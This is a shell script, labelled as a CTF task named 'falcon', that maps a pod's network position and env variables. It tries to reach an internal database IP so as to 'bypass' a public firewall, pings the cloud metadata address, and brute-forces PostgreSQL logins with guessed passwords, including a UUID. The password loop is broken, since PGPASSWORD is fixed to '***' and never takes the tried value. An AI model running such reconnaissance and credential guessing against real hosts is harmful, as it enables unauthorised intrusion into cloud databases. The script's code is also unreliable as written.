#!/bin/sh
# CTF falcon — pod network position + internal IP reachability
{
  echo "=== NET POSITION ==="
  ip addr 2>/dev/null | grep -E "inet |^[0-9]"
  echo "--- routes ---"; ip route 2>/dev/null
  echo "--- dns ---"; cat /etc/resolv.conf 2>/dev/null
  echo "--- env (Aiven) ---"; env | grep -iE "aiven|region|vpc|zone|cluster|pod|region" | head
  echo
  echo "=== internal IP 10.1.47.111 (bypass public FW) ==="
  for p in 5432 12691; do
    if (echo > /dev/tcp/10.1.47.111/$p) 2>/dev/null; then echo "10.1.47.111:$p OPEN"; else echo "10.1.47.111:$p closed/timeout"; fi
  done
  echo "=== public IP 132.145.163.127 (control) ==="
  for p in 12691; do
    if timeout 4 bash -c "(echo > /dev/tcp/132.145.163.127/$p)" 2>/dev/null; then echo "pub:12691 OPEN"; else echo "pub:12691 closed/timeout"; fi
  done
  echo
  echo "=== Aiven internal services reachable? ==="
  for h in 169.254.169.254 10.1.47.111 10.0.0.1; do
    ping -c1 -W1 $h >/dev/null 2>&1 && echo "$h pingable" || echo "$h no-ping"
  done
  echo "=== try PG on internal IP (common pw) ==="
  for pw in falcon aiven password postgres dev-sandbox sandbox 812de5da-0bab-4990-90e8-57303eebfd30; do
    if PGPASSWORD=*** timeout 4 psql -h 10.1.47.111 -p 12691 -U falcon -d postgres -c "select 1" 2>/dev/null | grep -q 1; then
      echo "INTERNAL HIT pw=$pw"; break
    fi
  done
  echo "=== END ==="
} 2>&1 | head -80